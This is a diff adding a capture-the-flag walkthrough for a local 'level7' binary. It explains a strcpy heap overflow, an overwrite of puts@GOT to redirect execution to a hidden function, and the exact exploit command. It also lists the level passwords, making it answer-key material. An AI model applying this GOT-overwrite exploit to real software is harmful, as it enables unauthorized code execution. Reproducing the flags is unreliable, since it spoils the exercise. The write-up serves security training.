@@ -1,0 +1,47 @@
+1. Download the binary from the server:
+   scp -P 2222 level7@localhost:~/level7 .
+   Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+2. Analyze the binary with Ghidra:
+   - Two heap structures, each with an id and data pointer
+   - strcpy(ptr1->data, argv[1]) - heap overflow vulnerability
+   - strcpy(ptr2->data, argv[2]) - controlled write primitive
+   - Hidden function m() at 0x080484f4 that prints global c
+   - Global variable c at 0x08049960 (80 bytes)
+   - puts@GOT at 0x08049928
+
+3. Verify heap layout with ltrace:
+   ltrace ./level7 AAA BBB
+   
+   Output shows:
+   malloc(8)  = 0x0804a008  ← ptr1 structure
+   malloc(8)  = 0x0804a018  ← ptr1->data buffer
+   malloc(8)  = 0x0804a028  ← ptr2 structure
+   malloc(8)  = 0x0804a038  ← ptr2->data buffer
+
+4. Calculate the exploit:
+   Goal: Overwrite puts@GOT to point to m()
+   
+   Distance from ptr1->data to ptr2->data pointer:
+   0x0804a02c - 0x0804a018 = 20 bytes (0x14)
+   
+   argv[1]: Overflow ptr1->data to overwrite ptr2->data with puts@GOT address
+   - Padding: 20 bytes
+   - Target: 0x08049928 (puts@GOT)
+   - Little-endian: \x28\x99\x04\x08
+   
+   argv[2]: Write m()'s address to puts@GOT
+   - Target: 0x080484f4 (address of m)
+   - Little-endian: \xf4\x84\x04\x08
+
+5. Connect to the VM via SSH:
+   ssh level7@localhost -p 2222
+   Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+6. Execute the exploit:
+   ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+7. Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+8. Exit and login as level8:
+   su level8
